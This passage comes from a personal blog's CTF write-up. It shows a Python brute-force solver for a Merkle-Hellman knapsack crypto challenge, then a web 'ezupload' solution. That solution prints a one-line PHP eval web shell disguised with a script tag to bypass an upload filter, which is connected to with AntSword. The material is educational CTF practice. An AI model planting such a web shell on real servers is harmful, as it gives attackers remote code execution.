<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x0000000000000001</span>, <span class="number">0x00000000000001FE</span>, <span class="number">0x0000000000001A79</span>, <span class="number">0x0000000000004940</span>, <span class="number">0x000000000000712F</span>, <span class="number">0x000000000000E1C5</span>, <span class="number">0x000000000001E866</span>, <span class="number">0x000000000003B85C</span>, <span class="number">0x00000000000760B0</span>, <span class="number">0x00000000000ED95D</span>, <span class="number">0x00000000001DB360</span>, <span class="number">0x00000000003B4D46</span>, <span class="number">0x000000000076A007</span>, <span class="number">0x0000000000ED528C</span>, <span class="number">0x0000000001DA9434</span>, <span class="number">0x0000000003B51CEA</span>, <span class="number">0x00000000076A592D</span>, <span class="number">0x000000000ED4AA88</span>, <span class="number">0x000000001DA951A4</span>, <span class="number">0x000000003B529EF7</span>, <span class="number">0x0000000076A55442</span>, <span class="number">0x00000000ED4AB07B</span>, <span class="number">0x00000001DA9560A0</span>, <span class="number">0x00000003B52AACC4</span>, <span class="number">0x000000076A5553D9</span>, <span class="number">0x0000000ED4AA997D</span>, <span class="number">0x0000001DA9553387</span>, <span class="number">0x0000003B52AA7EED</span>, <span class="number">0x00000076A554F324</span>, <span class="number">0x000000ED4AA9E5D7</span>, <span class="number">0x000001DA9553C9B2</span>, <span class="number">0x000003B52AA79A0C</span>]</span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    tmp = <span class="number">0x10A9FC70042</span> * i</span><br><span class="line">    tmp %= <span class="number">0x682669BC19DB</span></span><br><span class="line">    b.append(tmp)</span><br><span class="line"></span><br><span class="line">res = [<span class="number">0x00030970372813D2</span>, <span class="number">0x0002D3A89BCA52AC</span>, <span class="number">0x00031551E79154A2</span>, <span class="number">0x0002C522E9A5298A</span>, <span class="number">0x0002A61367C5C698</span>, <span class="number">0x000264491C01CAFD</span>, <span class="number">0x00026CA3A06C98B3</span>, <span class="number">0x0002DACBD12FB903</span>, <span class="number">0x0002E470707574E1</span>, <span class="number">0x000309E5DC39A9A7</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(x)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        res += b[i] * (x &amp; <span class="number">1</span>)</span><br><span class="line">        x &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(res)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">120</span>,<span class="number">0x80</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x20</span>,<span class="number">0x80</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0x20</span>,<span class="number">0x80</span>):</span><br><span class="line">                <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">0x20</span>,<span class="number">0x80</span>):</span><br><span class="line">                    tmp = (i&lt;&lt;<span class="number">24</span>) + (j&lt;&lt;<span class="number">16</span>) + (k &lt;&lt;<span class="number">8</span>) + z</span><br><span class="line">                    <span class="keyword">if</span> encrypt(tmp) == res:</span><br><span class="line">                        print(long_to_bytes(tmp)[::<span class="number">-1</span>])</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;m3Rkl3_h3LLMaN_KNaPsacK_Al90R17Hm!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>过滤了php等等一些字符，传shell，蚁剑连接执行readflag即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"phP"</span>&gt; </span><br><span class="line">  @<span class="keyword">eval</span>($_POST[<span class="string">"pass"</span>]);</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>flag{39b842b4-a290-4fe8-9d83-757ff4a8b4cc}</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i>CTF</a>
          
            <a href="/tags/Crypto/" rel="tag"><i class="fa fa-tag"></i>Crypto</a>
          
            <a href="/tags/Reverse/" rel="tag"><i class="fa fa-tag"></i>Reverse</a>
          
            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i>Web</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/02/18/Install-OracleDB-On-CentOS7/" rel="next" title="Install OracleDB(12cSE) on CentOS7">
                <i class="fa fa-chevron-left"></i> Install OracleDB(12cSE) on CentOS7
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/02/29/WannaCry/" rel="prev" title="WannaCry勒索病毒分析">
                WannaCry勒索病毒分析 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/feng.jpg"
                alt="feng" />
            
              <p class="site-author-name" itemprop="name">feng</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">12</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yifeng-lee" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:feng@m.scnu.edu.cn" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#warm-up"><span class="nav-number">1.1.</span> <span class="nav-text">warm_up</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyRSA"><span class="nav-number">1.2.</span> <span class="nav-text">EasyRSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-RSA"><span class="nav-number">1.3.</span> <span class="nav-text">easy_RSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LCG"><span class="nav-number">1.4.</span> <span class="nav-text">LCG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easyVM"><span class="nav-number">2.1.</span> <span class="nav-text">easyVM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babymac"><span class="nav-number">2.2.</span> <span class="nav-text">babymac</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezupload"><span class="nav-number">3.1.</span> <span class="nav-text">ezupload</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright"><font color=black face=STLiti>Copyright &nbsp;</font><font color=black>&copy;</font> <font color=black face=STLiti><span itemprop="copyrightYear">2020</span></font>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder" style="font-family:STLiti;color:black;">feng . All Rights Reserved.</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
